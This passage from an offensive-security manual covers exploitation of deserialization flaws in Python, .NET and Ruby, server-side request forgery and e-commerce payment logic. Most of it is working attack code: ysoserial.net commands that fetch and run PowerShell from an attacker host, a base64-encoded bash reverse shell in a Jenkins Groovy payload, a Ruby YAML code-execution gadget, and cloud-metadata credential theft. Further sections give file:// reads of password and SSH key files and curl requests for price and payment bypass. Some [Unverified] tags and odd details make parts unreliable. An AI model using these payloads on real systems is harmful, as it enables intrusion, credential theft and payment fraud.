  -d "data=$(python3 -c 'import pickle, base64; print(base64.b64encode(pickle.dumps(Exploit())).decode())')"

# Via cached data or RPC call
# Depends on application-specific implementation
```

#### Protection Bypass Techniques

Some applications attempt to restrict pickle usage. Test bypass methods:

```python
#!/usr/bin/env python3
import pickle

# Method 1: Whitelist bypass using __reduce_ex__
class Exploit:
    def __reduce_ex__(self, protocol):
        import os
        return (os.system, ('id',))

# Method 2: Slot manipulation (if __slots__ is used)
class SlotExploit(object):
    __slots__ = ['cmd']
    
    def __reduce__(self):
        import os
        return (os.system, ('id',))

# Method 3: If pickle.Unpickler is used with restricted modules
# Exploit using available whitelisted modules
class WhitelistBypass:
    def __reduce__(self):
        # Use whitelisted module to chain into dangerous code
        import subprocess  # if whitelisted
        return (subprocess.call, (['id'],))

# [Unverified] Some applications use restricted __import__ 
# but overlook built-in module access through object.__class__.__bases__
```

### .NET Deserialization

.NET deserialization vulnerabilities occur in applications using BinaryFormatter, DataContractSerializer, or other unsafe deserializers with untrusted data.

#### Identifying .NET Serialization

.NET serialized data patterns:

```
BinaryFormatter:
00 01 00 00 (version header)
01 (object type indicator)

DataContractSerializer:
XML-based, starts with < character

NetDataContractSerializer:
Hybrid format with type information
```

Search for vulnerable patterns:

```bash
# .NET source code analysis
grep -r "BinaryFormatter\|Deserialize\|NetDataContractSerializer" /path/to/source --include="*.cs" --include="*.vb"

# Check for unsafe deserialization
grep -r "TypeNameHandling\|deserialize\|FromXml" /path/to/source --include="*.cs"

# Windows registry analysis (if access available)
reg query "HKLM\Software\Microsoft\.NET"

# File system analysis
find C:\Windows\Assembly -name "*.dll" 2>/dev/null | xargs strings | grep -i "serialization"
```

#### BinaryFormatter Exploitation

BinaryFormatter is fundamentally unsafe. Exploit using ObjectDataProvider gadget chains:

```csharp
// Vulnerable code
using System.Runtime.Serialization.Formatters.Binary;

BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(userProvidedStream);
```

Generate exploit payloads:

```bash
# Using ysoserial.net
git clone https://github.com/pwntario/ysoserial.net.git
cd ysoserial.net
msbuild ysoserial.sln /p:Configuration=Release

# List gadget chains for .NET
ysoserial.exe -g list

# Generate Windows command execution payload
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 \
  -c "calc.exe"

# Generate reverse shell
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 \
  -c "cmd.exe /c powershell -NoP -W H -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

# Save payload to file
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "id" > /tmp/payload.bin
```

#### Gadget Chain Selection (.NET)

Available chains depend on installed assemblies:

```
ObjectDataProvider         → Uses WPF, requires System.Xaml
WindowsIdentity            → Uses System.IdentityModel
PSObject                   → PowerShell gadget chain
ActivitySurrogateSelector  → Workflow Foundation chain
TextFormattingRunProperties → WPF text formatting
```

Test chain availability:

```bash
# PowerShell: check loaded assemblies
Get-AppDomain | Select-Object -ExpandProperty GetAssemblies | Select-Object FullName

# Windows: examine application directory for DLLs
dir "C:\Program Files\TargetApp\" *.dll
```

#### DataContractSerializer Exploitation

DataContractSerializer is safer than BinaryFormatter but still vulnerable under certain conditions:

```csharp
// Vulnerable pattern - type information included
var serializer = new NetDataContractSerializer();
serializer.Deserialize(stream);

// Exploitation using type information
```

```bash
# Generate payloads for NetDataContractSerializer
ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -o base64 \
  -c "cmd.exe /c calc"

ysoserial.exe -f NetDataContractSerializer -g ObjectDataProvider \
  -c "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps')"
```

#### Exploitation via .NET Remoting

[Inference] .NET Remoting services may accept serialized objects, providing an attack vector for gadget chain exploitation.

```bash
# Identify .NET Remoting services
nmap -p 1433,1521,1081 target.com

# Interact with remoting service
# Requires custom .NET client or tools like Process Hacker

# Use ExceptionReporter.net for known vulnerability
# https://github.com/ExceptionReporter/ExceptionReporter
```

#### Injection Attack Vectors

Deliver payloads through multiple channels:

```bash
# Via HTTP POST with serialized object
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/payload.bin

# Via cookie
curl -b "session=$(base64 /tmp/payload.bin | tr -d '\n')" https://target.com

# Via WCF endpoint
# Requires knowledge of service contract and communication binding

# Via application configuration (if XML-based serialization)
# Modify XML with malicious type information
```

#### .NET Deserialization Filters

Some applications implement deserialization filters. Understanding them:

```csharp
// SerializationBinder implementation (attempt to restrict types)
public sealed class SafeSerializationBinder : SerializationBinder
{
    private static readonly HashSet<string> AllowedTypes = new HashSet<string>
    {
        "System.Collections.Generic.List`1",
        "Application.Models.User",
        // Limited whitelist
    };

    public override Type BindToType(string assemblyName, string typeName)
    {
        if (AllowedTypes.Contains(typeName))
            return Type.GetType($"{typeName}, {assemblyName}");
        throw new SerializationException("Type not allowed");
    }
}
```

Bypass attempts:

```bash
# Test polymorphic types not explicitly listed
# Example: List<T> may be whitelisted but List<T> subclasses may not

# Attempt version confusion attacks
# Different .NET versions may handle types differently

# Use gadget chains from whitelisted namespaces
# ysoserial.net attempts automatic namespace discovery
```

### Ruby Marshalling Exploitation

Ruby's Marshal.load() deserializes objects, enabling arbitrary code execution. Ruby has fewer built-in gadget chains than Java but is still exploitable.

#### Identifying Ruby Serialization

Ruby marshalled data begins with version headers:

```
\x04\x08           → Marshal version 4.8 (common)
\x04\x09           → Marshal version 4.9
```

Patterns in Ruby applications:

```bash
# Search Rails applications
grep -r "Marshal\.load\|Marshal\.restore" /path/to/rails --include="*.rb"

# Check for cache stores using Marshal
grep -r "cache_store.*:.*marshal" /path/to/rails --include="*.rb"

# Analyze cached data
# Redis: KEYS * | MGET <keys>
redis-cli KEYS "*" | xargs redis-cli MGET

# Memcached
echo "stats items" | nc localhost 11211
echo "get <key>" | nc localhost 11211

# Session storage (if using Marshal-based sessions)
find /tmp/sessions -name "*.session" 2>/dev/null
```

#### Marshal Format Analysis

Ruby Marshal uses type codes:

```
i      → Integer
f      → Float
"      → String
[      → Array
{      → Hash
T      → True
F      → False
N      → Nil
o      → Instance of class
C      → Class reference
R      → Symbol reference
```

Example: `\x04\x08o:\x0bDanger\x06` represents an instance of class "Danger"

#### Gadget Chain Development

Ruby lacks universal gadget chains but ERB (Embedded Ruby) provides exploitation:

```ruby
# Vulnerable pattern
class DataLoader
  def initialize(data)
    @data = Marshal.load(data)
  end
end

# Exploitation using ERB gadget
require 'erb'

# Craft malicious object that triggers ERB during deserialization
class Exploit
  def initialize
    @template = ERB.new("<%= system('id') %>")
  end
  
  def result
    @template.result
  end
end

# Serialize
payload = Marshal.dump(Exploit.new)
```

Generate exploits using automated tools:

```bash
# Using ruby_deserialization_gadget
git clone https://github.com/staaldraad/ruby_deserialization_gadget.git

# Generate payload
ruby /path/to/gadget_generator.rb "id" > /tmp/payload.bin

# For more complex payloads with available gems
# Create custom Ruby script leveraging application gems
```

#### Gem-Based Gadget Chains

[Inference] Available gems in the target application may provide exploitation vectors. Common vulnerable gems include Rails (through ERB), Sinatra (through template engines), and Rack.

Analyze Gemfile for vulnerable dependencies:

```bash
# Examine Gemfile and Gemfile.lock
cat Gemfile | grep -E "rack|rails|sinatra|erubi|haml"

# Check gem versions for known vulnerabilities
gem list -r | grep -E "rack|rails"

# Common vulnerable patterns
# - Rails with unsafe deserialization in cache
# - Sinatra with YAML parsing
# - Gems providing additional Magic methods
```

#### Exploitation Techniques

Inject payloads at identified Marshal.load() points:

```bash
# Via Rails cache (if accessible)
rails console
Rails.cache.read("<key>")

# Via cookie (if using Marshal-based session storage)
# Generate Ruby script to create payload
ruby << 'EOF'
require 'erb'

class Exploit
  def initialize(cmd)
    @cmd = cmd
  end
  
  def to_s
    @cmd
  end
end

# Wrap in appropriate gadget
# Output as hex/base64 for HTTP injection
EOF

# Via Redis/Memcached (if internal access available)
redis-cli SET vulnerable_key "<marshalled_data>"

# Monitor for execution
tail -f /var/log/rails.log | grep -E "error|exception|executed"
```

#### Protection and Filter Bypass

Some applications restrict Marshal deserialization:

```ruby
# Application attempts to whitelist classes
class SafeMarshal
  ALLOWED_CLASSES = [String, Integer, Array, Hash].freeze
  
  def self.load(data)
    marshal = Marshal.new
    # [Unverified] Even with whitelisting, certain gadget chains may bypass
    # Bypasses involve leveraging allowed classes' internal structures
  end
end
```

Bypass techniques:

```ruby
# Method 1: Leverage allowed classes to chain into dangerous code
# Example: Use String with specific encoding to trigger Ruby internals

# Method 2: Exploit symbol interning
# Symbols created during deserialization may be leveraged

# Method 3: Use module/class hierarchy traversal
# Example: Traverse from allowed class to dangerous one

# [Inference] Custom bypass development requires deep knowledge
# of Ruby internals and target application structure
```

#### YAML-Based Exploitation

Ruby applications sometimes parse YAML (similar serialization format):

```bash
# YAML deserialization in Ruby often enables type instantiation
# Vulnerable pattern: YAML.load() without Psych.safe_load

grep -r "YAML\.load" /path/to/source --include="*.rb"

# YAML payload generation
cat << 'EOF' > payload.yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
EOF

# More complex YAML gadget chain
# Use system command execution through YAML objects
```

Generate YAML exploits:

```bash
# Using ERB within YAML
payload='--- !ruby/object:Gem::Package::TarReader
io: &1 !ruby/object:Net::BufferedIO
io: &1 !ruby/object:Gem::Package::TarReader::Entry
read: 0
header: "abc"
debug_output: &1 !ruby/object:Net::WriteAdapter
socket: &1 !ruby/module "Gem::RequestSet"
sets: !ruby/object:Net::WriteAdapter
socket: !ruby/module "Gem::RequestSet"
sets: !ruby/object:Gem::RequestSet
git_set: ""
always_install: []
prerelease: false
specs:
- - "!"
  - "ruby/object:Gem::Requirement"
  requirements:
    !ruby/object:Gem::Package::Source
    uri: "| id > /tmp/pwned"'

echo "$payload" | ruby -ryaml -e 'YAML.load(STDIN.read)'
```

---

## Server-Side Request Forgery (SSRF)

### Internal Network Scanning via SSRF

SSRF vulnerabilities allow an attacker to make the server issue requests to internal resources that would be unreachable from the attacker's machine. This enables reconnaissance of the internal network topology and services.

#### Vulnerability Identification

Identify endpoints that accept URL parameters or make external requests. Common patterns include URL validation, image proxying, webhook handlers, and API integrations:

```
/proxy?url=http://example.com
/fetch?link=http://example.com
/image?src=http://example.com
/webhook?callback=http://example.com
/validate?website=http://example.com
/api/download?url=http://example.com
```

Test by making the server request your controlled domain:

```bash
# Using Burp Repeater, modify the URL parameter
GET /proxy?url=http://attacker-controlled-domain.com HTTP/1.1

# Monitor your server logs or use Burp Collaborator for out-of-band detection
# If request appears in logs, SSRF likely exploitable
```

#### Internal Network Range Enumeration

RFC 1918 private IP ranges:

- 10.0.0.0/8 (10.0.0.0 – 10.255.255.255)
- 172.16.0.0/12 (172.16.0.0 – 172.31.255.255)
- 192.168.0.0/16 (192.168.0.0 – 192.168.255.255)

Additional reserved ranges:

- 127.0.0.0/8 (Loopback)
- 169.254.0.0/16 (Link-local)

#### Automated Network Scanning

Use Burp Suite Intruder to brute-force internal IP addresses and ports:

1. Capture request with SSRF parameter
2. Set payload position around URL: `GET /proxy?url=http://10.0.0.FUZZ:8080 HTTP/1.1`
3. Configure Intruder with numeric ranges (0-255 for final octet)
4. Analyze responses for varying status codes, response times, or content lengths
5. Identify active hosts (200 OK, shorter timeouts, different response sizes)

Alternative: Use a payload list in Burp:

```bash
# Generate IP list with common ports
for i in {0..255}; do
  for port in 22 80 443 3306 5432 6379 8080 8443 9000; do
    echo "http://10.0.0.$i:$port"
  done
done > ssrf_targets.txt
```

Then use this list in Burp Intruder.

#### Service Fingerprinting

Once a service is identified, fingerprint it by analyzing response characteristics:

```bash
# Response status codes indicate service type
200 OK = Service responding normally
403 Forbidden = Authentication required
500 Internal Server Error = Service error (may leak info)
Connection refused = Port closed
Timeout = Firewall blocked

# Response headers reveal service identity
curl -I http://10.0.0.50:8080
# Server: Apache/2.4.41 (Ubuntu)
# Server: nginx/1.18.0
# etc.
```

Test common service paths:

```
/admin
/login
/api
/.env
/config
/version
/status
/health
```

Analyze response content for error messages, version strings, or default pages.

#### [Inference] Time-based Detection

If responses are filtered or redacted, use response time analysis to infer service presence:

```bash
# Services that respond quickly = likely running
# Services that timeout = not running

# In Burp Intruder, configure to measure response times
# Services under 500ms = active
# Services over 10s timeout = inactive
```

### Cloud Metadata Endpoint Access

Cloud providers expose metadata endpoints accessible from within instances. Accessing these endpoints via SSRF leaks credentials, configuration, and sensitive data.

#### AWS Metadata Endpoints

**IMDSv1** (Instance Metadata Service v1 - inherently vulnerable):

```bash
# Metadata endpoint (accessible from within AWS)
http://169.254.169.254/latest/meta-data/

# Retrieve IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, e.g., "EC2-Instance-Role"

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Instance-Role/
# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

**IMDSv2** (Token-based, less vulnerable but exploitable via SSRF):

```bash
# Step 1: Obtain session token
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Returns: AQAAAJxxxxx...

# Step 2: Use token to access metadata
curl -H "X-aws-ec2-metadata-token: AQAAAJxxxxx..." \
  http://169.254.169.254/latest/meta-data/
```

SSRF exploitation of IMDSv2:

```bash
# Attacker crafts request that server-side code processes
GET /proxy?url=http://169.254.169.254/latest/api/token%20HTTP/1.1
Host: target.com
```

The server's HTTP client library follows the request, receives the token, then uses it in subsequent requests.

**Sensitive metadata endpoints:**

```
/latest/meta-data/iam/security-credentials/
/latest/meta-data/instance-identity/document
/latest/meta-data/hostname
/latest/meta-data/ami-id
/latest/meta-data/instance-type
/latest/user-data/
/latest/meta-data/network/interfaces/macs/
```

#### Google Cloud Metadata Endpoints

```bash
# GCP metadata endpoint
http://metadata.google.internal/computeMetadata/v1/

# Required header for GCP (prevents accidental exposure)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity

# SSRF exploitation (bypass required header via proxy)
GET /proxy?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true HTTP/1.1
```

**Sensitive GCP endpoints:**

```
/computeMetadata/v1/instance/service-accounts/default/
/computeMetadata/v1/instance/service-accounts/default/identity
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/instance/disks/
/computeMetadata/v1/project/project-id
/computeMetadata/v1/instance/guest-attributes/
```

#### Azure Metadata Endpoints

```bash
# Azure metadata endpoint
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/

# Response contains bearer token for Azure Resource Manager
```

#### [Unverified] Kubernetes Service Accounts

If application runs in Kubernetes:

```bash
# Kubernetes API endpoint
http://kubernetes.default.svc/api/v1/

# Service account token location
/var/run/secrets/kubernetes.io/serviceaccount/token

# Exploit via SSRF to access cluster API
http://kubernetes.default.svc/api/v1/namespaces/default/pods/
```

### Local Service Exploitation

After identifying internal services via SSRF, exploit them to gain unauthorized access or functionality.

#### Database Service Exploitation

**MySQL/MariaDB** (default port 3306):

```bash
# Attempt to connect and execute query
# Using SSRF, initiate connection to database

# If application uses gopher protocol (if supported):
gopher://10.0.0.50:3306/_select%20user()%3b

# MySQL protocol basics for exploitation:
# Default credentials: root (no password), root:password
# Common databases: mysql, information_schema, performance_schema
```

**PostgreSQL** (default port 5432):

```bash
# Similar exploitation via SSRF
# Default credentials: postgres:password

# Payload format (if protocol supported):
/proxy?url=postgresql://postgres:password@10.0.0.50:5432/postgres
```

**Redis** (default port 6379, no authentication):

```bash
# Redis commands via SSRF
# If application makes raw socket connections

# Command format: COMMAND\r\n
# INFO command (information disclosure)
# SET key value (data manipulation)
# FLUSHDB (data destruction)

# SSRF payload example:
/proxy?url=gopher://10.0.0.50:6379/_INFO%0a

# Using netcat for Redis exploitation (from compromised server)
nc 10.0.0.50 6379
KEYS *
GET key_name
FLUSHALL
```

#### Message Queue Exploitation

**RabbitMQ** (default port 5672, web UI on 15672):

```bash
# Access web management interface via SSRF
http://10.0.0.50:15672

# Default credentials: guest:guest
# Management API endpoints:
/api/vhosts
/api/users
/api/permissions
/api/queues

# Enumerate messages in queue
GET /proxy?url=http://10.0.0.50:15672/api/queues HTTP/1.1
```

**Apache Kafka** (default port 9092):

```bash
# Kafka broker exploitation
# Enumerate topics and partitions
# Read message content (if not encrypted)

# Using Kafka client libraries from compromised server
kafka-console-consumer --bootstrap-server 10.0.0.50:9092 --topic topic-name --from-beginning
```

#### Cache Service Exploitation

**Memcached** (default port 11211):

```bash
# Memcached protocol (text-based)
# No authentication by default

# Commands:
get key
set key 0 0 5
value
stats
flush_all

# SSRF exploitation via gopher protocol:
gopher://10.0.0.50:11211/_get%20secret_key%0a

# Extract cached data
gopher://10.0.0.50:11211/_stats%0a
```

#### Local Web Service Exploitation

**Jenkins** (default port 8080):

```bash
# Jenkins Script Console (requires admin)
http://10.0.0.50:8080/script

# Jenkins API endpoints
http://10.0.0.50:8080/api/json
http://10.0.0.50:8080/api/json?tree=jobs[name,builds[number,result]]

# Build history (information disclosure)
http://10.0.0.50:8080/job/job-name/buildHistory/api/json
```

**Grafana** (default port 3000):

```bash
# Grafana API
http://10.0.0.50:3000/api/datasources

# Dashboard enumeration
http://10.0.0.50:3000/api/search?type=dash-db

# Authentication bypass (if public_grafana enabled)
http://10.0.0.50:3000/public/plugins/
```

#### Administrative Interface Access

```bash
# Common admin paths
/admin
/management
/console
/control-panel
/settings

# SSRF payload
GET /proxy?url=http://10.0.0.50:8080/admin HTTP/1.1

# Monitor for authentication bypass or default credentials
```

### File Protocol Exploitation

The `file://` protocol reads local files from the server's filesystem. Many applications fail to restrict this protocol in URL handling.

#### File Protocol Basics

```bash
# Basic file read
file:///etc/passwd
file:///c:/windows/win.ini (Windows)
file:///var/www/html/config.php

# URL encoding for special characters
file:///var/www/html/config%2ephp
```

#### Sensitive File Discovery

**Linux/Unix:**

```
/etc/passwd
/etc/shadow (requires root)
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/version
/proc/cpuinfo
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/var/log/auth.log
/var/log/apache2/access.log
/var/www/html/config.php
/.env
/app/settings.py
```

**Windows:**

```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/windows/system32/config/security
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/programfiles/application/config.xml
c:\inetpub\wwwroot\web.config
```

#### Exploitation Techniques

**Direct file read via SSRF:**

```bash
# Burp Repeater
GET /proxy?url=file:///etc/passwd HTTP/1.1
Host: target.com

# Server fetches local file and returns contents
```

**Filter bypass techniques:**

```bash
# Case variation
file:///ETC/PASSWD

# URL encoding
file://%2fetc%2fpasswd

# Double encoding
file:///%252fetc%252fpasswd

# Protocol variation (if file:// blocked, try others)
gopher:///etc/passwd (unlikely to work)

# Null byte injection (older systems)
file:///etc/passwd%00.jpg

# Unicode encoding
file:///etc/passwd%ef%bc%8f

# Backslash variation
file:///..\..\..\..\etc\passwd

# Path traversal with symlinks
file:///var/www/html/../../etc/passwd
```

#### Credential and Configuration Extraction

**Web application configuration files:**

```bash
# PHP
/var/www/html/config.php
/app/config/database.php
/config/settings.php

# Python
/app/settings.py
/config.yaml
/.env
/app/app.cfg

# Node.js
/.env
/config.js
/server.js

# Java
/WEB-INF/web.xml
/WEB-INF/context.xml
/WEB-INF/spring-config.xml
/application.properties
/application.yml
```

These files often contain database credentials, API keys, and connection strings.

**SSH Keys:**

```bash
# Private keys allow lateral movement
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/.ssh/id_rsa

# Authorized keys reveal trust relationships
/root/.ssh/authorized_keys
```

**Application source code:**

```bash
/var/www/html/index.php
/app/main.py
/src/app.js

# Reveals business logic, additional vulnerabilities, and hidden endpoints
```

#### Wrapper Protocol Exploitation

**PHP filters** (if application processes PHP):

```bash
# Read PHP source code (base64 encoded)
php://filter/convert.base64-encode/resource=/var/www/html/config.php

# Bypasses .php execution filter
# Returns base64-encoded file content, decode locally to read
```

**Expect protocol** (if enabled):

```bash
# Execute commands
expect://id
expect://cat /etc/passwd

# Typically disabled in modern PHP
```

**Data wrapper** (PHP):

```bash
# Embed data directly
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# If application processes data:// URIs
```

### SSRF to RCE Chains

Escalate SSRF vulnerabilities to remote code execution through exploiting local services or leveraging secondary vulnerabilities.

#### Exploitation via Local Services

**Gopher Protocol to Redis RCE:**

```bash
# Redis can execute system commands via Lua scripts or via exploitation

# SSRF payload targeting Redis
gopher://10.0.0.50:6379/_*3%0d%0a%243%0d%0aset%0d%0a%242%0d%0arce%0d%0a%2420%0d%0a

# Alternative: Send raw Redis protocol commands
# SET rce "<command>"
# EVAL lua_script

# If Redis data stored in web-accessible location, trigger execution
```

**Gopher Protocol to SMTP for Command Injection:**

```bash
# Send email with command execution payload
# Some applications execute commands from email content

gopher://10.0.0.50:25/_MAIL%20FROM:%20attacker@example.com%0d%0a
```

**Gopher to MySQL UDF (User Defined Function) RCE:**

```bash
# MySQL with FILE privileges can write files
# Write UDF shared object to plugin directory
# Load and execute UDF

gopher://10.0.0.50:3306/_<mysql_protocol_commands>

# Complex exploitation requiring specific MySQL configuration
```

#### Exploitation via Local Web Services

**Jenkins Script Console:**

```bash
# Access Jenkins console via SSRF
GET /proxy?url=http://localhost:8080/script HTTP/1.1

# Jenkins Groovy script console executes arbitrary code
# Intercept response, extract form fields

# Send malicious Groovy payload
java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcjo0NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")
```

**Tomcat Manager Deployment:**

```bash
# Access Tomcat manager via SSRF
GET /proxy?url=http://localhost:8080/manager/html HTTP/1.1

# Deploy malicious WAR file containing JSP shell
# Requires valid credentials (often default tomcat:tomcat)
```

**FTP Server Write and Execute:**

```bash
# If FTP service on internal network with write permissions
ftp://user:password@10.0.0.50/var/www/html/

# Write JSP/PHP shell to web root via SSRF
# Access uploaded shell via subsequent HTTP request
```

#### Chained Exploitation Example

**AWS Lambda RCE via Metadata and Function Invocation:**

1. **Access metadata endpoint via SSRF:**

```bash
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role HTTP/1.1
# Extract AccessKeyId, SecretAccessKey, Token
```

2. **Use credentials to invoke Lambda function:**

```bash
# Attacker uses extracted credentials
aws lambda invoke \
  --function-name malicious-function \
  --payload '{"cmd":"id"}' \
  response.json
```

3. **Execute arbitrary commands in Lambda context**

**Kubernetes SSRF to Cluster Compromise:**

1. **Identify Kubernetes API via SSRF:**

```bash
GET /proxy?url=http://kubernetes.default.svc/api/v1/namespaces/default/pods HTTP/1.1
```

2. **Extract service account token from pod:**

```bash
GET /proxy?url=http://localhost:8001/api/v1/namespaces/default/serviceaccounts/default/token HTTP/1.1
```

3. **Use token to deploy malicious container:**

```bash
curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -d @malicious-pod.json
```

#### SSRF Filter Bypass Techniques

**IP address obfuscation:**

```bash
# Decimal notation
http://2130706433/ (127.0.0.1)

# Hexadecimal notation
http://0x7f000001/ (127.0.0.1)

# Octal notation
http://0177.0.0.1/ (127.0.0.1)

# Mixed notation
http://127.1/ (127.0.0.1)

# IPv6 format
http://[::1]/ (127.0.0.1)
http://[::ffff:127.0.0.1]/ (127.0.0.1)
```

**Hostname techniques:**

```bash
# Localhost variations
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::]/

# Domain bypass
http://localhost.localdomain/
http://127.0.0.1.nip.io/ (resolves to 127.0.0.1)

# Redirect via attacker-controlled server
http://attacker.com/redirect-to-localhost
# attacker.com redirects to 127.0.0.1
# If application follows redirects, SSRF succeeds
```

**Protocol confusion:**

```bash
# URL scheme variations
http://10.0.0.50:@127.0.0.1/
# Confuses URL parser about actual target

# Using fragments and credentials
http://127.0.0.1@10.0.0.50/
http://10.0.0.50#@127.0.0.1/
```

**[Unverified] DNS rebinding:**

```bash
# Attacker controls DNS record for attacker.com
# First lookup returns attacker's IP
# SSRF makes request to attacker.com
# Second lookup returns 127.0.0.1 or internal IP
# Application's HTTP client follows through to local service
```

#### Exploitation Workflow Summary

1. **Identify SSRF vulnerability:** Send request to attacker-controlled domain and verify callback
2. **Scan internal network:** Enumerate services on RFC 1918 ranges and common ports
3. **Fingerprint services:** Analyze response characteristics to identify service types
4. **Extract credentials:** Access cloud metadata endpoints or read configuration files via file://
5. **Exploit local services:** Leverage identified services (Redis, MySQL, Jenkins) for unauthorized access
6. **Achieve RCE:** Chain exploits to achieve arbitrary command execution through service integration

---

Advanced detection of SSRF includes analyzing application code for URL handling patterns, monitoring outbound network connections from application servers for anomalous requests to internal ranges, and implementing WAF rules that block requests to RFC 1918 addresses combined with server-side request validation.

---

## Business Logic Exploitation

### Payment Process Bypass

Payment bypass vulnerabilities occur when applications fail to properly validate payment workflows, allowing attackers to obtain goods or services without proper payment.

**Price Manipulation Testing**

```bash
# Intercept and modify price parameters
# Original request:
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":99.99}'

# Modified requests to test:
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":0.01}'

curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":-99.99}'

curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":0}'

# Test with string values
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":"free"}'

# Test with null/undefined
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1,"price":null}'

curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":1}'
```

**Currency Manipulation**

```bash
# Test currency switching after price calculation
# Step 1: Add item in USD
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"currency":"USD"}'

# Step 2: Switch to weaker currency before checkout
curl -X PUT https://target.com/api/cart/currency \
  -H "Content-Type: application/json" \
  -d '{"currency":"IDR"}'  # Indonesian Rupiah

# Step 3: Complete purchase
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"cart_id":456}'

# Test decimal precision exploitation
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"price":99.999999999999999}'

# Test with invalid currency codes
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"currency":"XXX","price":1}'
```

**Quantity Manipulation**

```bash
# Negative quantity
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":-1,"price":99.99}'

# Zero quantity
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":0}'

# Very large quantity (integer overflow)
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":2147483647}'

# Decimal quantity where integer expected
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":0.5}'

# Test quantity-price calculation overflow
curl -X POST https://target.com/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"item_id":123,"quantity":9999999,"price":0.01}'
```

**Discount/Coupon Abuse**

```bash
# Apply same coupon multiple times
curl -X POST https://target.com/api/cart/coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE20"}'

curl -X POST https://target.com/api/cart/coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE20"}'

# Test with expired coupons
curl -X POST https://target.com/api/cart/coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon":"EXPIRED2020"}'

# Test coupon stacking
curl -X POST https://target.com/api/cart/coupons \
  -H "Content-Type: application/json" \
  -d '{"coupons":["SAVE20","SAVE30","FREESHIP"]}'

# Manipulate coupon value
curl -X POST https://target.com/api/cart/apply \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE20","discount":100}'

# Test case sensitivity
curl -X POST https://target.com/api/cart/coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon":"save20"}'

# Test for SQL injection in coupon code
curl -X POST https://target.com/api/cart/coupon \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE20'\'' OR '\''1'\''='\''1"}'
```

**Payment Method Bypass**

```bash
# Skip payment step entirely
# Normal flow: cart -> shipping -> payment -> confirm
# Test: cart -> shipping -> confirm (skip payment)

curl -X POST https://target.com/api/order/confirm \
  -H "Content-Type: application/json" \
  -d '{"cart_id":123,"shipping_id":456}'

# Test with invalid payment method
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"payment_method":"free","amount":99.99}'

curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"payment_method":"","amount":99.99}'

# Test status manipulation
curl -X POST https://target.com/api/payment/callback \
  -H "Content-Type: application/json" \
  -d '{"order_id":123,"status":"paid","payment_id":"fake123"}'

# Replay successful payment notification
# Capture legitimate payment callback, replay with different order_id
curl -X POST https://target.com/api/payment/webhook \
  -H "Content-Type: application/json" \
